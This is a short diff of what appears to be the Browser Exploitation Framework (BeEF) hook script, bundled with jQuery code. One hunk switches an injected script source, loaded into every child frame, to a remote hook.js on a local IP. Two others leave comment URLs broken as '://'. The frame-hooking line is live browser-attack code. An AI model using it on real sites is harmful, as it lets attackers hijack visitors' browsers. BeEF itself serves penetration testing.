@@ -574,7 +574,7 @@ jQuery.each( [ "load", "unload", "error" ], function( _, name ) {
 		// Use .triggerHandler here because:
 		// - load and unload events don't need to bubble, only applied to window or image
 		// - error event should not bubble to window, although it does pre-1.7
-		// See http://bugs.jquery.com/ticket/11820
+		// See ://bugs.jquery.com/ticket/11820
 		this.triggerHandler.apply( this, args );
 		return this;
 	};
@@ -761,7 +761,7 @@ if ( jQuery.Callbacks ) {
 
 //
 // Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
-// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// Browser Exploitation Framework (BeEF) - ://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
 
@@ -8938,7 +8938,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'http://192.168.1.57:3000/hook.js';
+        script.src = 'https://192.168.1.57:3000/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
